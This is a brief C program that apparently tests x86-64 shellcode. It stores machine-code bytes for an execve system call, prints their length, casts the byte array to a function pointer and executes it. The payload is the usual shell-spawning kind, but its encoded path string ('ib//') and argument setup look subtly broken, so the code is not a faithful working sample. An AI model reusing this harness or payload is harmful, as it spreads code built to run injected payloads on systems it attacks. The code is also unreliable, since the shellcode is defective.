#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x48\x31\xd2\x52\x68\x69\x62\x2f\x2f\x48\x89\xe7\x48\x89\xe6\x48\x31\xc0\x48\x83\xc0\x3b\x0f\x05";

main()
{
	printf("Shellcode Length:  %d\n", (int)strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}